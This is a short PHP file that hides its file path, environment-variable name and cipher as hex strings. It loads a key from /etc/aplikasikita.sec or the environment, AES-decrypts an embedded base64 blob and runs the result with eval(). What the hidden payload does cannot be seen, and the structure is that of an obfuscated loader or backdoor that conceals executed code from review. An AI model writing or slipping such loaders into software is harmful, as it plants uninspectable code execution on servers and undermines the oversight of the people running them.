<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Wql+hD7K7PCWVMbE9Thk7Q==');

$c=base64_decode(

'7+TqS7emPkmpCegE+oaaVIcvGt3BmVoThub+f0u5KILvMsCB1LqJCYzPwaDs8Ifs2e4uyQusgeSD' .
'3NjEg0NzmGVDhYEmd1eyBgTI2KbITeiYouVFdZdAAfDbHGkBnffH2VIBXs6e667Ej22n5xeuliiZ' .
'2cpUfvOfALn9+htYyfCNFhaNUJL1qFE6NnLx6BMHdpPFfFhKICyASkoMa++nvqpbQVY2FwRhk282' .
'LxjIA0lQZ3N6RGvgcOACCxTt9ih9G0Ink2l8/apeF/1VMp8RHTPLjZ4qPq9JLi8zvPr1BqgnyGOO' .
'5InRsruSNgvNXYjT9H1Zii2MSBW+SgM8S1H4EQbrHVL0Atwet8H+vUpONlfmwXiQkgPKdQOQIOOG' .
'tszlqz79BVE/+/QIKOyCm2IfdToTyLRFaZj7jvzSVKi/oNhv+XthP+Dppiiptrm/OtBqa7fDwhwm' .
'AA557A5f0NkaHJLASBTNSG+o9k7nbEAhIlxf62Bb0V7gSl0MNBG7althjACIMej8xLwvzfWC4+QC' .
'/GRfckDQCd65xDGL6K79PTA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

